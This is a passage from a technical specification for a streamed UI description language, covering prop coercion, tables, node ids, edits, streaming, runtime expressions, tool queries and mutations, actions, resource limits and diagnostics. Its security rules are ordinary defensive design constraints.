- Otherwise `v` is resolved: literals to their values, calls to nodes, lists and objects part by
  part, references by §10.3. If a part turns out to be a runtime value, the whole prop goes to
  `dyn`, as written.
- Otherwise the resolved value is coerced (§11.4) and stored in `props`.

A later value for the same prop replaces an earlier one, whether static or runtime.

### 11.4 Coercion

Coercion is deterministic. It applies to static values when a statement completes and to runtime
values each time they are evaluated.

| Prop type | Accepted as is | Converted | Otherwise |
|---|---|---|---|
| `string` | text | a number or boolean becomes its text form (§18.3) | `invalid-prop` |
| `number` | a number | text that reads as a number by the rule of §12.3 (`"$1,200"` is 1200) | `invalid-prop` |
| `boolean` | `true`, `false` | the texts `"true"` and `"false"` | `invalid-prop` |
| `enum` | see below | see below | `invalid-enum` |
| `node` | a component; text | | `invalid-prop` |
| `nodes` | a list | one component becomes a list of one | `invalid-prop` |
| `data` | a table; a list | | `invalid-prop` |
| `array` | a list | one text, number or boolean becomes a list of one, with an `invalid-prop` warning marked `fixed` | `invalid-prop` |
| `object` | an object | | `invalid-prop` |
| `action` | a step or a list of steps (always a runtime expression) | | `invalid-prop` |
| `state` | a state variable (always a runtime expression) | | `invalid-prop` |
| `any` | anything | | |

**`null`.** For every type, `null` means "not given": the prop is left unset, so its default
applies. No diagnostic is reported for the `null` itself. If the prop is required,
`missing-required` follows (§11.8).

**Invalid values.** When a value is not accepted, the prop takes its `default` if it has one and is
otherwise left unset. `invalid-prop` is a warning. It is `fixed` when the prop has a default or is
not required.

**Enums.** A text value `v` is resolved by the first step that succeeds:

1. `v` is one of `values`.
2. `v`, or `v` in lower case, is a key of `aliases`: the alias target.
3. A value equals `v` when case is ignored: that value.
4. A value is at distance 2 or less from `v` (§9.5): the nearest one, the first on a tie.
   `invalid-enum` (warning, `fixed`, `use` = the value used) is reported.
5. The enum is `open`: `v` as written.
6. Otherwise the prop takes its default, or is left unset, and `invalid-enum` (error) is reported.
   It is `fixed` when the prop has a default or is not required.

A value that is not text gives `invalid-enum` (error) as in step 6. Rules 5 and 6 of §11.2 store
the word without these steps.

**Lists.** The `items` type of an `array` prop is used to resolve bare words in the list (a bare
word in a list of `string` items can become text, §15) and for URL checks (§23.4). Items are not
coerced in 1.0.

**URLs.** A `string` prop with `format: "url"`, and a list whose `items` have it, are checked by
§23.4. A refused URL becomes `""` (in a list it is left out) and `blocked-url` (warning, `fixed`)
is reported.

### 11.5 Children

A value in child position becomes children as follows. *P* is the id path of the place (§13.3).

| Value | Children |
|---|---|
| a string | one text node: a node of the catalog's text component with the string in its text prop, id *P* |
| a number, `true` or `false`, a `WORD` | one text node with its text form |
| `null` | none |
| a component call | that component, id *P* |
| a list | the children of each item, in order, with ids *P*`.0`, *P*`.1`, … |
| a reference to a component or runtime statement | that node |
| a reference to a data statement | its value, spread: a string, number or boolean is a text node; a list is spread item by item; a component in it is that component; `null` is nothing; a table or an object gives `invalid-child` (warning) and nothing |
| an object literal | `invalid-child` (warning) and nothing |
| a reference to an id not defined yet | a `#pending` node while streaming (§13.2); see §15 at the end |
| any runtime expression | an `#expr` node with the expression in `dyn.value`, id *P* |

A string child is Markdown for the text component (§23.5).

If C restricts its children (`children.of`), every child node whose type is not allowed and does
not start with `#` gives `invalid-child` (warning, `use` = the child's type) on the statement that
owns C. The check is made at end of stream. The child is kept.

### 11.6 `children` and `style`

`children: v` as a named argument, on a component with children, adds `v` as children at that
place in the argument list. It is not a prop.

`style: v` is accepted on every component, declared or not. It carries a design object for the
renderer's styling layer. The processor stores an object value under `props.style` (or `dyn.style`
for a runtime expression) and does not look inside it, except for §23.4. A value that is not an
object gives `invalid-prop` (warning, `fixed`) and is dropped. The keys of a design object are
defined by the catalog or renderer, not by this document.

### 11.7 Unknown components

An `#unknown` node keeps what the program wrote so that a renderer can still show its content:

- `props.component` is the name as written.
- Each named argument with a static value is a prop under its key as written. A named argument
  with a runtime value goes to `dyn`. No coercion is applied.
- Each positional argument is added as children (§11.5).

A renderer MUST draw the children of an `#unknown` node. It MUST NOT use its props as markup,
attributes or script.

### 11.8 Required props

When a component is complete, each prop with `required: true` that has neither a static value nor
a `dyn` expression gives `missing-required` (error, `prop` = the name), in declaration order. While
streaming, a prop whose value is a reference to a statement that has not arrived is not missing
yet.

### 11.9 Table mappings

Some components take their data in parts (`BarChart(labels, Series…)`). A **table mapping** lets
such a component take a table instead. A mapping has `labels`, `values` and `columns`, all
optional:

- `labels`: the prop that receives the first column, as the text of its cells.
- `values`: the prop that receives the next column (the first, if `labels` is not set), as numbers.
- `columns`: one child node for each column after the `labels` column. The child's type is
  `columns.component`; its `columns.label` prop is the column name; its `columns.values` prop is
  the list of cells, as numbers if `columns.numeric` and as text otherwise; its `columns.type`
  prop, if named, is `"number"` or `"string"` when the header has a type hint (§12.2). The child's
  id is *id*`/col`*j*, where *j* is the column index from 0.

A cell is turned into a number as in §12.3, and is `null` when it does not read as one. Props set
by a mapping are not coerced and count as set for §11.3.

## 12. Tables

```
rev = |Month|Revenue:n|Note
|---|---|---|
|Apr|$84,500|a \| b
|May|€87,200.50|
```

### 12.1 Rows and cells

```
row      = "|" cell { "|" cell } [ "|" ] ;
```

- Each line of a table statement is trimmed. It is a row if it starts with `|`.
- Cells are separated by `|`. `\|` is a literal `|`. There is no other escape: a `\` anywhere else,
  quotes, `#` and brackets are ordinary text. A CR is dropped.
- Each cell is trimmed.
- A `|` at the end of the row closes the last cell. It does not add an empty cell.
- A row with no cell at all (a lone `|`) is skipped.
- A **separator row**, in which every cell is two or more `-` with an optional `:` at either end,
  is skipped wherever it appears.

### 12.2 Header and columns

The first row that is not skipped is the header. Each header cell names a column. A cell that ends
in `:n` or `:s` (no space after the colon) gives the column the type `number` or `string`; the
name is the text before the colon, trimmed; the column is **hinted**.

A column without a hint takes its type from the first data row: `number` if that cell reads as a
number (§12.3), `string` otherwise. With no data row the type is `string`.

Column names need not be unique or non-empty. A generator SHOULD make them unique. Where a column
is found by name (§18.5), the first column with that name is used.

### 12.3 Data rows

Each later row is a data row. A row with more cells than columns loses the extra cells. A row with
fewer gets empty cells. No diagnostic is reported for either.

A cell **reads as a number** when, after removing all whitespace and every `,`, `$`, `€`, `£`,
`¥`, `%` and `+`, the rest matches

```
[ "-" ] ( digit { digit } [ "." { digit } ] | "." digit { digit } ) [ ( "e" | "E" ) [ "+" | "-" ] digit { digit } ]
```

Its value is that decimal number. So `$84,500` is 84500, `+6.2%` is 6.2, `1 234` is 1234 and `5.`
is 5. `,` is always a thousands separator and `.` is always the decimal point: `1.234,56` is read
as 1.23456. See §25.

### 12.4 The table value

A table is the value

```
{ "columns": [ { "name": text, "type": "number" | "string", "hinted": true? } ],
  "rows":    [ [ cell, … ], … ],
  "text":    [ [ text, … ], … ] }
```

- `rows` holds one list per data row, with one entry per column. In a `number` column the entry is
  the number the cell reads as, or `null`. In a `string` column it is the cell text, or `null` for
  an empty cell.
- `text` holds the cell texts as written (trimmed), with `""` for an empty or missing cell. A
  renderer SHOULD display `text`, so that `$84,500` is shown as the program wrote it.
- `hinted` is present and `true` only for hinted columns.

A table is a valid value for a `data` prop, for a component with a table mapping, and in runtime
expressions (§18.5). One table can feed several components. A table in child position is not
drawn (§11.5).

A table statement is defined only by `id = |…`. It cannot be patched or appended to, and a state
declaration cannot hold one.

## 13. The abstract tree

### 13.1 Nodes

The output of a processor is a set of **nodes** and the id of the **root** node. A node has:

| Field | Meaning |
|---|---|
| `id` | unique in the set (§13.3) |
| `type` | a component name of the catalog, or a special type (§13.2) |
| `props` | a map from prop name to static value: text, number, boolean, `null`, list, object, table, or a node reference |
| `children` | an ordered list of node ids |
| `dyn` | optional: a map from prop name to a runtime expression |
| `partial` | `true` while the statement that owns the node is still open (§16) |
| `stmt` | the id of the statement that owns the node |
| `expected` | optional, on `#pending` only (§13.2) |

`props` holds only props that have a value. A prop is never in both `props` and `dyn`.

### 13.2 Special types

| Type | Meaning | A renderer |
|---|---|---|
| `#pending` | A place for a statement that is referenced but has not arrived. Exists only while streaming. `expected` is the component type the parent accepts there, when the parent accepts exactly one type. | SHOULD draw a placeholder |
| `#expr` | A value computed at run time. `dyn.value` is the expression. | draws what the runtime gives (§18.9); a Core renderer draws nothing |
| `#fragment` | What a runtime gives a renderer for an `#expr` node: a list of children with no element of its own. Never produced by a processor. | draws the children in place |
| `#unknown` | A component the catalog does not have (§11.7). | MUST draw its children |

### 13.3 Node ids

Node ids identify nodes to renderers (as keys), to hosts (in action envelopes, §20.3) and to edits.

- The node of a component or runtime statement has the statement id.
- A node written inside a statement has a path under it. The path of argument *i* (counted from 0
  over all arguments, named and empty ones included) of the node *N* is *N*`/`*i*. A named
  argument `key:` has the path *N*`/`*key* (the key as written). A patch `id.prop` has the path
  *id*`/@`*prop*.
- Item *j* of a list at path *P* has the path *P*`.`*j*. The entry `k` of an object at path *P* has
  the path *P*`.`*k*.
- In a data statement `id = […]` the path of the value is `id`, so its items are `id.0`, `id.1`, ….
- A child made by a table mapping has the id *N*`/col`*j* (§11.9).
- A `#pending` node has the id of the statement it waits for.

Examples: `mau/1` (second argument of `mau`), `tabs/0.2` (third item of a list that is the first
argument), `card/title`, `card/@title`.

Nodes generated by a runtime (§18.8) MUST have ids that are unique, do not collide with the ids
above, and stay the same when the same expression is evaluated again for the same item. The
reference implementation uses *owner*`~`*path*.

### 13.4 The tree

The **tree** is what is reached from the root through `children` and through node references in
`props`. A node that is referenced from two places appears in both: the tree is the unfolding of a
directed acyclic graph. Cycles are removed at end of stream (§15).

Following a chain of more than 400 nodes from the root, a processor MAY stop (§21).

### 13.5 JSON form

`schemas/tree.schema.json` defines the JSON form of a tree, used by the conformance suite:

```json
{ "type": "Card",
  "props": { "v": "sunk" },
  "dyn": { "title": "\"Total: \" + @sum(rows.total)" },
  "children": [ { "type": "Text", "props": { "content": "Hello" } } ] }
```

- `props` is left out when empty. `children` is left out when empty.
- A node reference in `props` is written as the referenced node, in place.
- `dyn` values are written in the canonical text form of Appendix B.
- A table is written `{ "table": ["Month:s", "Revenue:n"], "rows": [...] }`: the column names with
  `:n` or `:s`, and the typed rows. `text` and `hinted` are not written.
- `id`, `partial` and `expected` are optional in the JSON form. The conformance suite does not
  write them.

## 14. Edits

A program can change statements that came earlier in the same text. This is how a generator edits
an existing program: the host sends the current program, the generator writes only the changes,
and the result is the old text followed by the new.

**Redefinition.** `id = …` for an id that is already defined replaces the definition. The last
complete definition wins. Patches and appends applied to the earlier definition are discarded, and
so are its diagnostics. The kind of the statement can change. If the new definition is dropped by
§8.2, the earlier one stays, with its patches and appends.

**Deletion.** `id = null` removes the statement and the nodes it owns. A reference to a deleted id
is dropped and no diagnostic is reported for it. Deleting an id that was never defined is allowed.
If the id is defined again later, it exists again, and references to it resolve to the new
definition.

**Patch.** `id.prop = v` sets one prop of a component statement.

- `id` MUST be a component statement that is already defined at that point of the text. Otherwise
  the patch is ignored and `patch-target-missing` (error) is reported, with `id` as the statement
  and the line of the patch.
- `prop` is looked up as a named argument is (§11.3): by schema name, without regard to case, and
  through aliases. A prop that was passed by position can be patched by its name.
- The value is bound as a named argument. It replaces the value from the call. A later patch of
  the same prop replaces an earlier one.
- `id.prop = null` removes the prop.
- `id.children = v` replaces the children of `id`: the children written in the call and any
  appended before the patch.
- `id.style = v` replaces the design object.

**Append.** `id += v` adds `v` at the end of the argument list of a component statement, as a
positional argument. For a component with children that is a new last child. If `id` is a data
statement whose value is a list literal, `v` becomes its last item. For any other target the
append is ignored and `patch-target-missing` (error) is reported.

Syntax diagnostics inside a patch or append statement are reported on the target statement.

**Canonical printout (informative).** For an edit turn a host needs to show the generator the
current program in a form where every component can be addressed. The reference implementation
prints each statement once, with patches and appends folded into the call, and moves every inline
component into its own statement named `_c1`, `_c2`, …. After the edit it prints the merged program
again and leaves out statements that the root no longer reaches. Expressions are printed in the
form of Appendix B.

## 15. End of stream

When the host signals the end of the stream, the processor MUST do the following, in order.

1. **Close the text.** Decode any pending bytes. If a statement head is incomplete, the line is
   prose. Apply R2 or R3 to an open statement. A statement whose body is empty is dropped by §8.2.
2. **Resolve references.** Remove every `#pending` node. For each reference to an id that no
   statement defines (and that was not deleted):
   - in a `string` prop, or in a list whose `items` type is `string`: the word itself becomes the
     text, and `bare-text` (warning) is reported;
   - anywhere else: the reference is dropped, and `unresolved-ref` (error, `fixed`, `ref` = the id)
     is reported on the statement that holds it.
3. **Choose the root.**
   - If a statement `root` exists and is a component or runtime statement, its node is the root.
   - If a statement `root` exists and is anything else, there is no root.
   - If no statement `root` exists, the first component statement, in order of definition, is the
     root, and `no-root` (warning, `fixed`) is reported.
   - If there is no root, `no-root` (error) is reported, the tree is empty, and steps 5 to 7 are
     skipped.
4. **Check children** (§11.5): `invalid-child`.
5. **Cut cycles.** Walk the tree from the root, depth first, through `children` in order and then
   through node references in `props`. A reference to a node that is on the current path is
   removed from the node that holds it, and `cycle` (error, `fixed`, `ref` = the id referenced) is
   reported on the statement that owns that node.
6. **Cap repeated components** (§21): `limit`.
7. **Report unused statements.** A statement is *used* if it is the root statement or is referred
   to by a used statement, in a static position or in a runtime expression. State declarations
   count: `$x` is used when a used statement reads `$x`. Every statement that is not used gives
   `unreachable` (warning), in order of definition. Unused statements stay defined.

After the end of the stream no node has `partial: true`.

## 16. Streaming

A processor reads text in chunks of any size, from one byte up.

**Chunk invariance.** For a given input and catalog, the final tree, the final set of nodes and
the final list of diagnostics (§22.2) MUST NOT depend on how the input was divided into chunks.

**While the stream is open** a processor SHOULD expose intermediate results so that a renderer can
draw early. If it does, these rules apply:

- A statement that has ended is final. It is parsed once.
- The open statement MAY be shown before it ends. It is read as a prefix: a name, number or
  operator that touches the end of the text so far is left out, because it can still grow (`Car`
  can become `CardHeader`); a string that is still open shows its content so far; open brackets are
  treated as closed. Recovery rules and syntax errors are not reported for an open statement.
- Every node owned by the open statement has `partial: true`.
- A reference to a statement that has not arrived is a `#pending` node in child position and in a
  `node` or `nodes` prop, and an unset prop elsewhere. When the statement arrives it takes the
  place of the `#pending` node. The parent does not change.
- While a redefinition is open, the earlier definition MUST stay in effect for anything that reads
  its value (state defaults, queries). It is replaced when the new one completes.
- A runtime MUST NOT call a tool for a query whose statement is still open, and MUST NOT take a
  state default from an open declaration (§18.2, §19.1).
- The cost of processing SHOULD be linear in the length of the input.

Intermediate results are not compared by the conformance suite.

## 17. Validity

A processor reports, with the tree and the diagnostics, two flags:

- **strict**: no diagnostic has the severity `error`.
- **lenient**: a root exists, and every diagnostic with the severity `error` is `fixed`.

Strict implies lenient. A program is **clean** when the processor reports no diagnostic at all.

A lenient-valid program can be drawn as it is: every problem was repaired by a rule of this
document, and the tree shows the result of the repair. A host SHOULD draw a tree even when it is
not lenient-valid, and SHOULD make the diagnostics available (to a developer, or to a repair step).

## 18. Runtime: state and expressions

This section and §19 to §20 apply to runtimes (Interactive profile and above).

### 18.1 Values

A runtime value is one of: `null`, a boolean, a number (a finite IEEE 754 binary64 value), text, a
list, an object (a map from text keys to values), a table (§12.4), a node reference, or a lambda.

There is one "no value": `null`. A missing entry, an index out of range, a name that nothing
defines, an unknown built-in and a failed conversion all give `null`.

A runtime MUST read only the entries that the program or a tool result put in an object. It MUST
NOT expose members of the implementation language (prototype members, methods, reflection). The
keys `__proto__`, `$ref` and `$dyn` MUST be dropped from every object literal, by processors and
runtimes alike.

A lambda is a value only as an argument of a built-in. A prop whose expression evaluates to a
lambda is left unset.

### 18.2 State

`$name = expr` declares a state variable and its default.

- The default is evaluated once, when the complete declaration is first seen. If the host supplied
  an initial value for the name, that value is used instead.
- Reading a variable that has no value gives `null`. Writing one creates it.
- When a declaration is redefined (§14), the current value is kept. The new default is what
  `@reset` restores.
- Setting a variable to a value equal to its current one (§18.4, by content) does nothing.
  Otherwise everything that read the variable is evaluated again, and the runtime reports a `state`
  envelope (§20.3).

A prop of type `state` (`bind:$name`) is a **binding**. The runtime does not evaluate it. The
renderer reads the variable to show the control's value and writes it when the person changes the
control. A prop of type `action` is not evaluated either: it runs on a gesture (§20).

### 18.3 Conversions

**Truthiness.** `null`, `false`, `0`, the empty text and the empty list are *falsy*. Everything
else is *truthy*, including `"0"`, an empty object and an empty table.

**As a number.** A number is itself. Text is the number it reads as by §12.3, if it does. `true` is
1 and `false` is 0. Anything else, including `null`, is not a number.

**Text form.** `null` is the empty text. Text is itself. A boolean is `true` or `false`. A number
is its shortest decimal form that reads back as the same value, as ECMAScript `Number::toString`
gives it [ECMA262]. A list, object or table is its JSON text.

### 18.4 Operators

| Expression | Result |
|---|---|
| `!a` | `true` if `a` is falsy, else `false` |
| `-a` | the negation of `a` as a number; `null` if `a` is not a number |
| `a && b` | `a` if `a` is falsy; otherwise `b`. `b` is evaluated only in the second case |
| `a \|\| b` | `a` if `a` is truthy; otherwise `b`. `b` is evaluated only in the second case |
| `a == b` | `true` if `a` and `b` are the same value. Lists and objects are compared by content. Two values that are both text, number or boolean are also equal when their text forms are equal (`1 == "1"`). `null` equals only `null` |
| `a != b` | the opposite of `a == b` |
| `a < b`, `>`, `<=`, `>=` | if both are numbers (as a number, above), numeric order. Otherwise, if both are text, order by UTF-16 code units. Otherwise `false` |
| `a + b` | if neither is text: the sum of both as numbers, `null` if either is not a number. If either is text: the text forms joined |
| `a - b`, `a * b` | arithmetic on both as numbers; `null` if either is not a number |
| `a / b`, `a % b` | as above; `null` when `b` is zero. `%` takes the sign of `a` |
| `c ? a : b` | `a` if `c` is truthy, else `b`. Only the chosen branch is evaluated |

A result that is not a finite number is `null`. Text longer than the limit of §21 stops the
evaluation.

### 18.5 Member and index access

`x.name`:

| `x` is | Result |
|---|---|
| a table | `rows`: the list of records. `length`: the number of data rows. Otherwise the column named `name` (exact match first, then without regard to case), as the list of its cell values |
| a list | `length`: the number of items. Otherwise the list of each item's entry `name` (`rows.total` is every row's total) |
| text | `length`: the number of UTF-16 code units. Otherwise `null` |
| an object | its entry `name`, or `null` |
| anything else | `null` |

A **record** is an object with one entry per column, keyed by column name. A **cell value** is the
entry of `rows`, except that a number whose cell text is not exactly the number's text form (for
example `$1,184`) keeps the cell text. Such text still counts as a number in arithmetic and
comparisons.

`x[i]`:

| `x` is | Result |
|---|---|
| a table | the record of data row `i`, counted from 0 |
| a list | item `i`, counted from 0. A negative `i` counts from the end (`-1` is the last item) |
| an object | the entry whose key is the text form of `i` |
| anything else | `null` |

An index that is not a whole number, or is out of range, gives `null`.

### 18.6 Names

A bare word in a runtime expression is, in this order: a parameter of an enclosing lambda; a data
statement, which gives its value; a runtime statement, which gives its value; a component
statement, which gives a reference to its node; otherwise `null`.

- A statement whose value is `@query(…)` or `@mutation(…)` is read as §19 says.
- A runtime statement is evaluated at most once in one evaluation pass, however many expressions
  read it.
- A statement that reads itself, directly or through others, gives `null` at the point of the
  loop.
- A `WORD` gives its text. An enum value or flag kept by the processor gives its text or `true`.

### 18.7 Built-in functions

Names are matched without regard to case. Extra arguments are ignored. In the table, *as a list*
means: a list is itself, a table is its records, `null` is the empty list, and any other value is
a list of that one value. *by* is an optional argument that says what to take from each item: a
lambda is called with the item; text names an entry of the item; when it is left out the item
itself is used.

| Built-in | Result |
|---|---|
| `@each(list, fn)` | `fn` called for each item of `list` (as a list), as a list of the results. See §18.8. Not a lambda, or fewer than two arguments: the empty list |
| `@count(x)` | list: its length. Table: its data rows. Text: its length in UTF-16 code units. Object: its number of entries. Anything else: 0 |
| `@first(x)`, `@last(x)` | the first or last item of `x` as a list, or `null` |
| `@sum(list, by?)` | the sum of the items that are numbers. No such item: 0 |
| `@avg(list, by?)`, `@min(list, by?)`, `@max(list, by?)` | the mean, least or greatest of the items that are numbers. No such item: `null` |
| `@sort(list, by?, dir?)` | a new list, sorted. `dir` is `"asc"` (default) or `"desc"`, as a third argument or as `dir:`. Two keys that are both numbers are ordered as numbers. Otherwise their text forms are ordered by UTF-16 code units. The sort is stable |
| `@filter(list, by?)` | the items for which *by* is truthy |
| `@round(x, digits?)` | `x` rounded to `digits` decimals (0 to 10, default 0); halves round toward positive infinity. Not a number: `null` |
| `@abs(x)`, `@floor(x)`, `@ceil(x)` | as named. Not a number: `null` |
| `@fmt(x, kind?)` | `x` formatted as text. See below |
| `@join(list, sep?)` | the text forms of the items joined by `sep` (default `", "`) |
| `@query(…)`, `@mutation(…)` | defined only as the whole value of a statement (§19). Anywhere else: `null` |
| `@status(…)` | reserved. `null` |
| `@run`, `@set`, `@reset`, `@send`, `@open`, `@emit` | action steps (§20.2). As a value: `null` |
| any other name | `null`. No diagnostic is reported (§26.3) |

**`@fmt` kinds.** The kind is matched without regard to case. Output conventions are fixed (§25).

| Kind | Output |
|---|---|
| `"$"`, `"usd"`, `"currency"` | US dollars: `$`, `,` between thousands, `.` decimal, `-` before the `$`. Two decimals below 1000 in magnitude, none from 1000 up. `12.5` → `$12.50`, `412000` → `$412,000` |
| `"%"`, `"percent"` | if `x` is not 0 and between −1 and 1 inclusive, `x` × 100; then at most one decimal, and `%`. `0.125` → `12.5%`, `50` → `50%` |
| `"compact"` | a short form with `K`, `M`, `B`, `T` and at most one decimal. `1234567` → `1.2M` |
| `"date"` | `Oct 14, 2026`. Text of the form `YYYY-MM-DD` is that calendar day. A number is milliseconds since 1970-01-01T00:00Z, shown in the host's time zone. Other text is parsed as an ISO 8601 date-time |
| anything else, or left out | `,` between thousands, at most three decimals. `1234.5` → `1,234.5` |

If `x` is not a number (not a date, for `"date"`), the result is the text form of `x`.

### 18.8 `@each` and generated components

`@each(list, fn)` calls `fn` once for each item. The first parameter of `fn` is the item. The
second, if declared, is the index from 0. A generator MUST NOT declare more than two.

A component call inside a runtime expression produces a **generated node** each time the expression
is evaluated. Arguments are evaluated and then bound by §11.3 and coerced by §11.4, with these
differences: no diagnostic is reported; an argument naming an unknown prop is ignored; props of
type `action` and `state` keep their expression, with lambda parameters replaced by their current
values, so a button made for a row acts on that row.

**Identity.** The generated nodes of one `@each` item are identified by the item's key: the entry
`id` of the item, else its entry `key`, else its index. If two items have the same key, the later
one is identified by key and index. A renderer MUST keep the state of a generated component
(focus, input) when the list is evaluated again and the item keeps its key.

### 18.9 What a renderer receives

For each node the runtime gives the renderer a **view**:

- A node without `dyn` is given as it is.
- For a node with `dyn`, each expression is evaluated, coerced by §11.4 for its prop, and merged
  into `props`. A `null` or lambda result leaves the prop unset. Props of type `action` and `state`
  stay in `dyn`.
- An `#expr` node becomes a `#fragment` whose children come from the value by this rule: `null`,
  `false` and lambdas give nothing; a node reference gives that node; a list gives the children of
  each item in order; any other value gives one text node with its text form.

Evaluation is reactive: when a state variable, a query, a mutation status or a statement that a
view read changes, the view is evaluated again. A runtime SHOULD give the renderer the same view
object when nothing in it changed.

If evaluation reaches a limit (§21), the node is shown with its static props only, an `#expr` node
gives an empty fragment, and the runtime reports `limit` (§22.4).

## 19. Tools: queries and mutations

This section applies to the Tools profile.

### 19.1 Queries

```
sales = @query("get_sales", {range: $range}, default: {rows: []}, every: 60)
```

`@query(tool, args?, default: value?, every: seconds?)` MUST be the whole value of a statement.
`tool` is text. `args` is the second positional argument, or `args:`; when left out it is the
empty object.

- Reading the statement gives the last result of the tool, or `default` (else `null`) until a
  first result arrives.
- The runtime calls the tool when the statement is first read by something that is shown. A query
  that nothing reads is not called.
- The runtime calls the tool again when the tool name or the arguments change. Arguments are
  compared by content.
- The runtime MUST NOT call the tool while the statement is still open (§16).
- If the arguments of a query read the query itself, directly or through other statements, that
  inner read gives `null`.
- Two queries with the same tool and arguments that are loading at the same time SHOULD share one
  call.
- `every: n` asks for a refresh every `n` seconds. The interval is at least the host's minimum
  (default 5 seconds). A value that is not a positive number means no refresh. Limits are in §21.
  A runtime MUST stop the timer when the statement is deleted or stops being a query, SHOULD NOT
  refresh while the UI is hidden, and MUST let the host pause all timers.
- A failed call keeps the last result. The runtime records the error in the query's status and
  reports an `error` envelope (`tool-not-found` or `tool-failed`).

The runtime keeps a **status** for each query for the renderer: `loading`, `error`, `data`,
`updatedAt`. It is not readable from expressions in 1.0.

### 19.2 Mutations

```
save = @mutation("update_goal", {goal: $goal})
```

`@mutation(tool, args?)` MUST be the whole value of a statement. A mutation never runs by itself.
It runs only by `@run(id)` in an action list (§20), which a renderer starts only from a gesture of
the person. Its arguments are evaluated when it runs.

Reading the statement gives an object `{status, data, error}`: `status` is `"idle"`, `"pending"`,
`"success"` or `"error"`; `data` is the last result; `error` is the error text or `null`.

### 19.3 Tool sets

The host gives the runtime two separate sets of tools:

- **tools**: read-only tools. Only `@query` reaches them.
- **mutations**: tools that change something. Only `@mutation` reaches them.

A runtime MUST look a tool up only in the set for its kind, by exact name, among the names the
host listed. A name in one set MUST NOT be reachable from the other kind of call. When the host
passes a client for a remote tool server instead of a list, the runtime MUST NOT expose a tool to
`@query` unless the host named it in an allow list.

Before each call the runtime MUST:

1. fail with `tool-not-found` if the tool is not in the set;
2. fail with `tool-failed` if the call budget is used up (§21);
3. give the host the chance to see and refuse the call (a `tool` envelope, §20.3). A refused call
   fails with `tool-failed`.

### 19.4 Lifecycle

A host can create a runtime that is **not live**: the tree is built and expressions are evaluated,
but no tool is called and no timer runs until the host starts it. This is for rendering that
nobody looks at yet, such as a server render. A host can also **pause** a live runtime: refresh
timers stop, everything else continues.

## 20. Actions

### 20.1 Action lists

The value of an `action` prop (`do:[…]`) is one step or a list of steps. A step is a built-in call
from the table below.

- A renderer MUST run an action list only in response to a gesture of the person on the component
  that carries it (a click, a key press, a submit). It MUST NOT run one on render, on a timer, or
  because a value changed.
- Steps run in order. Each step finishes before the next starts.
- The arguments of a step are evaluated when that step runs. In
  `[@set($n, $n + 1), @send("n is " + $n)]` the message has the new value.

### 20.2 Steps

| Step | Effect |
|---|---|
| `@set($name, value?)` | sets the state variable; `null` when `value` is left out. If the first argument is not a state variable, the step does nothing |
| `@reset($a, $b, …)` | sets each variable to its declared default, evaluated again; `null` if it has no declaration |
| `@run(id)` | `id` is a bare word. If it names a query statement: calls its tool again and waits; the list continues even if the call fails. If it names a mutation statement: runs it and waits; if it fails, the list stops. Anything else is an unknown step |
| `@send(text)` | reports a `send` envelope with the text form of `text` |
| `@open(url)` | checks the URL (§23.3). Allowed: reports an `open` envelope. Refused: reports `blocked-url` and the list stops |
| `@emit(name, payload?)` | reports an `emit` envelope |

**Unknown steps.** A step that is not a built-in call, or whose name is not in the table, makes
the runtime report `unknown-step` and stop the list. Steps before it have already run.

The list also stops when the runtime is shut down.

### 20.3 The action envelope

A renderer and runtime report to the host with one JSON-compatible object, the **action
envelope**, defined by `schemas/action.schema.json`. `type` selects the shape.

| `type` | Fields | Sent when |
|---|---|---|
| `send` | `nodeId`, `message` | `@send`, or a component whose purpose is to send text (a follow-up chip) |
| `open` | `nodeId`, `url` | `@open` passed the URL check |
| `emit` | `nodeId`, `event`, `payload` | `@emit` |
| `submit` | `nodeId`, `form`, `values`, and optionally `partial`, `formId`, `submissionId`, `submittedAt`, `step`, `fields`, `schema`, `message` | a form component was submitted (§20.4) |
| `state` | `name`, `value` | a state variable changed |
| `tool` | `kind`, `name`, `args`, and optionally `nodeId` | before each tool call (§19.3) |
| `error` | `code`, `message`, and optionally `nodeId` | a runtime problem (§22.4) |

`nodeId` is the id of the node the person acted on, or for `tool` and `error` the node or
statement concerned.

A host MUST ignore an envelope whose `type` it does not know. Envelopes are produced by the UI, not
typed by the person: see §23.7.

### 20.4 Forms

This document does not define form components. A catalog defines them. It defines the two things a
form needs from the format:

- **Bindings** (§18.2) connect controls to state.
- The **`submit` envelope** carries the result. `form` is the form's name in the program. `values`
  is a map from field name to value. `partial` is `true` for a draft that was saved without
  validation. `message`, when present, is a short text summary that a chat host can pass to a
  model.

Validation rules are props of the catalog's field components. A renderer that validates MUST do so
before it reports a `submit` envelope that is not `partial`.

## 21. Resource limits

A program can be hostile or simply runaway. The limits below keep time and memory bounded. A
processor or runtime MUST apply them. The values are part of 1.0, because they decide which
diagnostics a program gets.

### 21.1 Processor limits

| Limit | Value | When it is reached |
|---|---|---|
| Nesting depth in one statement (calls, lists, objects, parentheses, lambda bodies, conditional branches, unary operators) | 100 | the statement is dropped; `limit` (error) with its line and no statement id |
| Binary operators in one chain | 500 | as above |
| Nodes owned by one statement | 5,000 | the statement builds nothing; `limit` (error) on it |
| Nodes in one program | 50,000 | as above, for the statement that passes the limit |
| Values in one data statement, counting inlined data | 200,000 | the statement has no value; `limit` (error) on it |
| Component instances in the tree (a node shown in *n* places counts *n* times) | 50,000 | from the leaves up, a node whose subtree would pass the limit drops the children and node props that no longer fit; its first child is always kept; `limit` (error) on its statement |
| Depth of the tree | 400 | deeper nodes are left out; no diagnostic |
| Nesting of unions in a catalog | 8 | deeper names are taken as component names |

### 21.2 Runtime limits

| Limit | Value | When it is reached |
|---|---|---|
| Evaluation steps in one pass | 500,000 | the evaluation stops (§18.9); `limit` |
| Statements being evaluated inside one another | 64 | the innermost read gives `null` |
| Items of one `@each` | 5,000 | the first 5,000 are used; `limit` |
| Generated nodes | 20,000 | the evaluation stops; `limit` |
| Length of text made by `+` or `@join` | 1,000,000 UTF-16 code units | the evaluation stops; `limit` |
| Queries with a refresh timer | 20 | later `every:` values are ignored; `limit` |
| Refresh interval | at least 5 s (the host MAY change the minimum); an interval longer than 2³¹ − 1 ms never fires | |
| Tool calls | 60 in any 10 s (the host MAY change the number) | the call fails with `tool-failed` |
| Digits of `@round` | 0 to 10 | clamped |

A runtime reports each `limit` once for each node and cause, not on every evaluation.

No input may make a processor or runtime fail with an unhandled error, exhaust the stack, or hang.

## 22. Diagnostics

### 22.1 The diagnostic object

A diagnostic is defined by `schemas/diagnostic.schema.json`.

| Field | Meaning |
|---|---|
| `code` | a code from §22.3. Stable across versions |
| `severity` | `"error"` or `"warning"` |
| `stmt` | the id of the statement concerned, when there is one. A state declaration is written with its `$` |
